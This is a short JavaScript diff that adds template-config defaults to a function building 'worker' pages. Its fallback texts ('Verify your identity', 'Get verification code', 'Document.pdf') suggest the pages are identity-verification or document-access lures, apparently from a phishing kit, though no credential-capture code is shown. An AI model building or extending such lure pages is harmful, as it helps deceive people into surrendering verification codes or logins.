@@ -41,13 +41,26 @@ function buildWorkerScript(link, user) {
     templateHTML = templateHTML.replace('</head>', '<script>' + vgEngine + '</script></head>');
   }
 
-  // Replace remaining placeholders
+  // Load template config for defaults
+  var templateConfig = {};
+  try {
+    templateConfig = require('../templates/' + templateType + '/config.json');
+  } catch(e) {}
+
+  // Helper to get config default
+  function getConfigDefault(key, fallback) {
+    if (!templateConfig || !templateConfig.fields) return fallback;
+    var field = templateConfig.fields.find(function(f) { return f.key === key; });
+    return field && field.default !== undefined ? field.default : fallback;
+  }
+
+  // Replace remaining placeholders - use template config defaults as fallbacks
   templateHTML = templateHTML
-    .replace('{{TITLE}}', link.title_text || 'Verify your identity')
-    .replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue')
-    .replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code')
-    .replace('{{FILE_NAME}}', link.file_name || 'Document.pdf')
-    .replace('{{PAGES}}', String(link.pages || 1));
+    .replace('{{TITLE}}', link.title_text || getConfigDefault('title', 'Verify your identity'))
+    .replace('{{MESSAGE}}', link.message_text || getConfigDefault('message', 'Please verify your identity to continue'))
+    .replace('{{BUTTON_TEXT}}', link.button_text || getConfigDefault('button_text', 'Get verification code'))
+    .replace('{{FILE_NAME}}', link.file_name || getConfigDefault('file_name', 'Document.pdf'))
+    .replace('{{PAGES}}', String(link.pages || getConfigDefault('pages', 1)));
 
   // Handle preload/no-preload
   try {
